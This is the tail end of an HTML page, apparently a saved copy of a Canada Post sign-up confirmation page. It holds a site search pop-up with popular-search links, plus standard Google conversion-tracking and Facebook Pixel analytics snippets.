          <div id="cpc-qualtrics-feedback-modal" class="cpc-feedback-modal-iframe-container"></div>
        </div>
      </div>
    </div></div><iframe height="0" width="0" style="display: none; visibility: hidden;" src="./successful_files/activityi(1).html"></iframe><section id="cpcSearchModal" class="cpc-component">
<div id="searchPopup" aria-live="assertive" role="dialog" aria-hidden="true">

  <div id="searchModalInputRow">
    <div id="searchModalInputContainer">
      <label for="searchModalInput" class="visually-hidden">Search products, related articles and support topics</label>
      <input id="searchModalInput" type="text" placeholder="Search our website" tabindex="0">
      <button id="searchModalBtn" class="searchModalBtn" aria-label="Search products, related articles and support topics" tabindex="-1">Search</button> 
    </div><div id="searchModalClose" aria-label="Close" tabindex="0"> </div>
    
  </div>
  <div id="searchModalLabelError" aria-live="assertive" role="alert">Please enter a topic. Examples: send packages, change my address</div>
  <div id="searchResultsRow">
    <div id="searchModalResults"></div>
    <h2>Popular searches</h2>
    <div class="row">
      <ul id="searchModalQuickLinks" class="searchModalQuickLinks small-12 medium-6 columns">
  <li class="search-modal-quick-link">
    <a href="//info/mc/personal/postalcode/fpc.jsf" class="search-modal-link" tabindex="0">
      <span class="search-icon look-up-postal-code"></span>
      <span class="search-modal-label">Look up a postal code</span>
    </a>
  </li>

  <li class="search-modal-quick-link">
    <a href="//cpc/en/personal/sending/letters-mail/postage-rates.page" class="search-modal-link" tabindex="0">
      <span class="search-icon stamp-prices"></span>
      <span class="search-modal-label">Stamp prices</span>
    </a>
  </li>

  <li class="search-modal-quick-link">
    <a href="//cpc/en/personal/receiving/manage-mail/mail-forwarding.page" class="search-modal-link" tabindex="0">
      <span class="search-icon mail-forwarding"></span>
      <span class="search-modal-label">Mail Forwarding</span>
    </a>
  </li>
</ul>
      <ul id="searchModalQuickLinks2" class="searchModalQuickLinks small-12 medium-6 columns">
  <li class="search-modal-quick-link">
    <a href="//track-reperage/en" class="search-modal-link" tabindex="0">
      <span class="search-icon track"></span>
      <span class="search-modal-label">Track</span>
    </a>
  </li>

  <li class="search-modal-quick-link">
    <a href="//cpc/en/support/postal-services-information.page" class="search-modal-link" tabindex="0">
      <span class="search-icon all-postal-guides"></span>
      <span class="search-modal-label">All postal guides</span>
    </a>
  </li>

  <li class="search-modal-quick-link">
    <a href="//cpc/en/support.page" class="search-modal-link" tabindex="0">
      <span class="search-icon support"></span>
      <span class="search-modal-label">Support</span>
    </a>
  </li>
</ul>
    <div>
  </div>
</div></div></div></section><img src="./successful_files/adsct" height="1" width="1" style="display: none;"><img src="./successful_files/adsct(1)" height="1" width="1" style="display: none;"><!--
Event snippet for Personal Account - Completion - EN on : Please do not remove.
Place this snippet on pages with events you’re tracking. 
Creation date: 03/11/2020
-->
<iframe height="0" width="0" style="display: none; visibility: hidden;" src="./successful_files/activityi(2).html"></iframe><script>
  gtag('event', 'conversion', {
    'allow_custom_scripts': true,
    'send_to': 'DC-9852050/canad0/perso000+unique'
  });
</script>
<noscript></noscript>
<!-- End of event snippet: Please do not remove --><!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '614267586032718');
fbq('trackCustom', 'SignUp Consumer EN');
</script>
<noscript></noscript>
<!-- End Facebook Pixel Code -->
<!--
Event snippet for Evergreen 2021 - Sign up - Complete - Consumer on : Please do not remove.
Place this snippet on pages with events you’re tracking. 
Creation date: 03/31/2021
-->
<iframe height="0" width="0" style="display: none; visibility: hidden;" src="./successful_files/activityi(3).html"></iframe><script>
  gtag('event', 'conversion', {
    'allow_custom_scripts': true,
    'send_to': 'DC-6048943/everg0/everg001+standard'
  });
</script>
<noscript></noscript>
<!-- End of event snippet: Please do not remove -->
</body></html>